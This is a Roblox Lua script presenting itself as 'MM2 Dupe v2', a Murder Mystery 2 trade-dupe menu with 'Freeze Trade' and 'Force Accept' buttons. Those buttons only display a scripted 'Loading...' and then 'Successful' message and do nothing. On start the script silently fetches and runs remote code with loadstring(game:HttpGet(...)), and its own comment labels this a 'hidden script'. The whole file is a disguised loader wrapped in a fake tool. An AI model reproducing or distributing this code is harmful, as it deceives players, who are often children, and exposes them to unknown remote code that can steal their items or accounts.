-- Create the ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "MM2Menu"
screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
screenGui.ResetOnSpawn = false -- Keep GUI when respawning

-- Execute the hidden script on initialization
local success, err = pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/omarsjsjjs/Dragableguiscript/refs/heads/main/Drag", true))()
end)
if not success then
    warn("Failed to load hidden script: " .. tostring(err))
end

-- Create the Frame (menu)
local menuFrame = Instance.new("Frame")
menuFrame.Name = "MenuFrame"
menuFrame.Size = UDim2.new(0, 320, 0, 220)
menuFrame.AnchorPoint = Vector2.new(0.5, 0.5) -- Center anchor point
menuFrame.Position = UDim2.new(0.5, 0, 0.5, 0) -- Center of the screen
menuFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- Black
menuFrame.BorderSizePixel = 0
menuFrame.Parent = screenGui

-- Round the edges
local uiCorner = Instance.new("UICorner")
uiCorner.CornerRadius = UDim.new(0, 10)
uiCorner.Parent = menuFrame

-- Create the title text
local title = Instance.new("TextLabel")
title.Name = "Title"
title.Size = UDim2.new(1, -40, 0, 30)
title.Position = UDim2.new(0, 20, 0, 5)
title.BackgroundTransparency = 1
title.Text = "MM2 Dupe v2"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Font = Enum.Font.GothamBold
title.TextSize = 18
title.Parent = menuFrame

-- Close button
local closeButton = Instance.new("TextButton")
closeButton.Size = UDim2.new(0, 25, 0, 25)
closeButton.Position = UDim2.new(1, -30, 0, 5)
closeButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
closeButton.Text = "X"
closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
closeButton.Parent = menuFrame
closeButton.MouseButton1Click:Connect(function()
    screenGui.Enabled = false
end)

-- Minimize button
local minimizeButton = Instance.new("TextButton")
minimizeButton.Size = UDim2.new(0, 25, 0, 25)
minimizeButton.Position = UDim2.new(1, -60, 0, 5)
minimizeButton.BackgroundColor3 = Color3.fromRGB(128, 128, 128)
minimizeButton.Text = "-"
minimizeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
minimizeButton.Parent = menuFrame

local minimized = false
minimizeButton.MouseButton1Click:Connect(function()
    minimized = not minimized
    for _, child in pairs(menuFrame:GetChildren()) do
        if child ~= title and child ~= minimizeButton and child ~= closeButton then
            child.Visible = not minimized
        end
    end
    menuFrame.Size = minimized and UDim2.new(0, 320, 0, 40) or UDim2.new(0, 320, 0, 220)
end)

-- Freeze Trade button
local freezeButton = Instance.new("TextButton")
freezeButton.Text = "Freeze Trade"
freezeButton.Size = UDim2.new(0, 140, 0, 30)
freezeButton.Position = UDim2.new(0, 10, 0, 50)
freezeButton.Parent = menuFrame
freezeButton.BackgroundColor3 = Color3.fromRGB(128, 128, 128)
freezeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
freezeButton.Font = Enum.Font.GothamBold
freezeButton.TextSize = 14

-- Force Accept button
local forceButton = Instance.new("TextButton")
forceButton.Text = "Force Accept"
forceButton.Size = UDim2.new(0, 140, 0, 30)
forceButton.Position = UDim2.new(0, 10, 0, 90)
forceButton.Parent = menuFrame
forceButton.BackgroundColor3 = Color3.fromRGB(128, 128, 128)
forceButton.TextColor3 = Color3.fromRGB(255, 255, 255)
forceButton.Font = Enum.Font.GothamBold
forceButton.TextSize = 14

-- Credits text
local credits = Instance.new("TextLabel")
credits.Text = "Credits to JNScripts"
credits.Size = UDim2.new(1, -10, 0, 20)
credits.Position = UDim2.new(0, 5, 1, -25)
credits.Parent = menuFrame
credits.TextColor3 = Color3.fromRGB(255, 255, 255)
credits.TextXAlignment = Enum.TextXAlignment.Right

-- Feedback handling
local function showLoadingAndSuccess(button, buttonText)
    button.Text = "Loading..."
    button.BackgroundColor3 = Color3.fromRGB(255, 165, 0) -- Orange for loading
    wait(3) -- Wait 3 seconds
    button.Text = buttonText .. " Successful"
    button.BackgroundColor3 = Color3.fromRGB(0, 255, 0) -- Green for success
    wait(2) -- Show success for 2 seconds
    button.Text = buttonText
    button.BackgroundColor3 = Color3.fromRGB(128, 128, 128) -- Reset to original
end

freezeButton.MouseButton1Click:Connect(function()
    showLoadingAndSuccess(freezeButton, "Freeze Trade")
end)

forceButton.MouseButton1Click:Connect(function()
    showLoadingAndSuccess(forceButton, "Force Accept")
end)

-- Draggable functionality
local UIS = game:GetService("UserInputService")
local dragging, dragStart, startPos

menuFrame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = menuFrame.Position
    end
end)

menuFrame.InputChanged:Connect(function(input)
    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        local delta = input.Position - dragStart
        menuFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)

menuFrame.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = false
    end
end)
